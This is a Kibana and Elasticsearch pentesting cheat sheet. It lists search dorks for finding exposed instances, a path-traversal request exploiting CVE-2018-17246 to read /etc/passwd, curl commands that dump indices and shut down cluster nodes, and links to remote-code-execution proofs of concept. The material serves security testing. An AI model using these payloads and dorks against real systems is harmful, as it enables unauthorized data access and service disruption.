#  Pentesting Kibana Service
Index | Section
--- | ---
**1** | Introduction to Kibana
**2** | Testing Kibana for Security Issues
**3** | References & Good Reads
___
#### Introduction to Kibana
```
Kibana is an open source data visualization dashboard for Elasticsearch. It provides visualization capabilities on top of the content indexed on an Elasticsearch cluster. Users can create bar, line and scatter plots, or pie charts and maps on top of large volumes of data. 

Learn More: https://www.elastic.co/kibana

```


#### Testing Kibana for Security Issues
```
This is a third party software so our goal is to check for the issues that are already known (CVEs) or look for the unauthenticated dashboards, sensitive data exposures, etc.

1. Shodan Dorks to finding Kibana Instances 
a. Dork: title:"kibana" port:"443"
b. Dork: kibana content-length: 217
c. Kibana will return a content length of 217 if it is publicly open and one can access the dashboard without authentication.
d. Original Tweets: 
- https://twitter.com/emenalf/status/1082935342477594624
- https://twitter.com/prateek_0490/status/1164564646738530304

2. Google Dorks to find Kibana Instances
a. inurl:app/kibana
b. inurl:app/kibana intext:Loading Kibana
c. inurl::5601/app/kibana

3. Elastic Search Kibana Console LFI (CVE-2018-17246)
a. Make a request to following endpoint to read /etc/passwd: 

> GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd

b. Original Tweet: https://twitter.com/IM_23pds/status/1074627634150006784

4. ElasticSearch CVE-2015-1427 RCE Exploit
a. Detailed Writeup: http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html


5. Some other ElasticSearch Pentest Tips

a. List All indexes
> curl -X GET http://localhost:9200/_cat/indices?v
b. List all docs in index
> curl -X GET http://localhost:9200/<index_name>/_search
> curl -X GET http://localhost:9200/esmapping/_search
c. Shutting Down Nodes 
> curl -X POST http://localhost:9200/_shutdown
> curl -XPOST 'http://localhost:9200/_cluster/nodes/_master/_shutdown

d. Original Post: https://www.facebook.com/ExWareLabs/posts/elasticsearch-pentest-tip1-list-all-indexescurl-x-get-httplocalhost9200_catindic/2496305100433349/

6. CVE-2019-7609
a. Proof of Concept: https://github.com/mpgn/CVE-2019-7609

7. Some other tips on Pentesting Kibana & ElasticSearch
a.  https://book.hacktricks.xyz/pentesting/5601-pentesting-kibana
b.  https://book.hacktricks.xyz/pentesting/9200-pentesting-elasticsearch

8. Known Vulnerabilities 

a. https://www.cybersecurity-help.cz/vdb/SB2020072815
b. https://www.cvedetails.com/vulnerability-list/vendor_id-13554/product_id-31867/Elasticsearch-Kibana.html

```


#### References & Good Reads

```
a. https://insinuator.net/2021/01/pentesting-the-elk-stack/#kibana
b. https://medium.com/@InfoSecIta/kibana-the-new-toy-for-pentesters-bughunters-hackers-e72048bd98b0
c. https://www.marcolancini.it/2018/blog-elk-for-nmap/
d. https://resources.infosecinstitute.com/topic/learning-pentesting-metasploitable3-exploiting-elasticsearch/
e. https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability

```
